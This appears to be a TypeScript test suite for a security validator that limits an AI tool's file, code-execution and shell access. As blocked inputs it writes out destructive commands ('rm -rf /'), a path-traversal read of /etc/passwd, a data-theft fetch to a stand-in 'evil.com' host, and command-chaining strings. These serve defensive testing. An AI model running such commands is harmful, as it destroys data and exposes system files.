
/**
 * Security Tests for AI Tools
 * Tests security boundaries and validation
 */

import { securityValidator } from '../security/validator';
import { FileSystemOperation, CodeExecutionRequest } from '../types';

describe('Security Validator', () => {
  describe('File System Validation', () => {
    test('should allow access to project directory', () => {
      const operation: FileSystemOperation = {
        operation: 'read',
        path: './src/test.ts',
      };

      const result = securityValidator.validateFileSystemOperation(operation);
      expect(result.allowed).toBe(true);
    });

    test('should block access to parent directories', () => {
      const operation: FileSystemOperation = {
        operation: 'read',
        path: '../../etc/passwd',
      };

      const result = securityValidator.validateFileSystemOperation(operation);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('outside allowed directories');
    });

    test('should block access to node_modules', () => {
      const operation: FileSystemOperation = {
        operation: 'read',
        path: './node_modules/package/index.js',
      };

      const result = securityValidator.validateFileSystemOperation(operation);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('blocked directory');
    });

    test('should block dangerous file extensions', () => {
      const operation: FileSystemOperation = {
        operation: 'write',
        path: './malware.exe',
      };

      const result = securityValidator.validateFileSystemOperation(operation);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('not allowed');
    });

    test('should allow safe file extensions', () => {
      const operation: FileSystemOperation = {
        operation: 'write',
        path: './src/utils.ts',
      };

      const result = securityValidator.validateFileSystemOperation(operation);
      expect(result.allowed).toBe(true);
    });
  });

  describe('Code Execution Validation', () => {
    test('should allow safe Python code', () => {
      const request: CodeExecutionRequest = {
        language: 'python',
        code: 'print("Hello World")',
      };

      const result = securityValidator.validateCodeExecution(request);
      expect(result.allowed).toBe(true);
    });

    test('should block dangerous commands in code', () => {
      const request: CodeExecutionRequest = {
        language: 'python',
        code: 'import os; os.system("rm -rf /")',
      };

      const result = securityValidator.validateCodeExecution(request);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('blocked command');
    });

    test('should block network access attempts', () => {
      const request: CodeExecutionRequest = {
        language: 'javascript',
        code: 'fetch("http://evil.com/steal-data")',
      };

      const result = securityValidator.validateCodeExecution(request);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Network access');
    });

    test('should enforce timeout limits', () => {
      const request: CodeExecutionRequest = {
        language: 'python',
        code: 'print("test")',
        timeout: 999999,
      };

      const result = securityValidator.validateCodeExecution(request);
      expect(result.allowed).toBe(true);
      expect(result.sanitizedInput.timeout).toBeLessThanOrEqual(30000);
    });
  });

  describe('Bash Command Validation', () => {
    test('should allow safe commands', () => {
      const result = securityValidator.validateBashCommand('ls -la');
      expect(result.allowed).toBe(true);
    });

    test('should block dangerous commands', () => {
      const result = securityValidator.validateBashCommand('rm -rf /');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('blocked operation');
    });

    test('should block command chaining', () => {
      const result = securityValidator.validateBashCommand('ls && rm file');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous pattern');
    });

    test('should block command substitution', () => {
      const result = securityValidator.validateBashCommand('echo $(whoami)');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous pattern');
    });
  });

  describe('Content Sanitization', () => {
    test('should allow content within size limit', () => {
      const content = 'Hello World';
      const result = securityValidator.sanitizeFileContent(content);
      expect(result.allowed).toBe(true);
    });

    test('should block content exceeding size limit', () => {
      const content = 'x'.repeat(11 * 1024 * 1024); // 11MB
      const result = securityValidator.sanitizeFileContent(content);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('exceeds maximum');
    });
  });
});
